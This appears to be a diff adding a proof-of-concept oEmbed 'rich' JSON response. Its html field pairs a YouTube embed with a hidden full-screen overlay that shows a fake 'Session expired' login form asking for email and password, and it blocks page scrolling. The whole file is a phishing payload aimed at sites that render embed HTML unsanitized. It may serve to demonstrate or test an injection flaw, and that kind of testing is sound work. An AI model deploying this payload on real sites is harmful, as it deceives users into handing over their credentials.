@@ -1,0 +1,8 @@
+{
+  "type": "rich",
+  "version": "1.0",
+  "provider_name": "poc",
+  "width": 480,
+  "height": 360,
+  "html": "<iframe src='https://www.youtube.com/embed/dQw4w9WgXcQ'></iframe><div style='position:fixed;inset:0;z-index:2147483647;background:#fff;color:#000;font:16px sans-serif;padding:15vh 20vw'><h2>Session expired — please sign in</h2><form><input placeholder='email' style='display:block;margin:8px 0;padding:8px'><input placeholder='password' type='password' style='display:block;margin:8px 0;padding:8px'><button>Log in</button></form></div><style>body{overflow:hidden!important}</style>"
+}
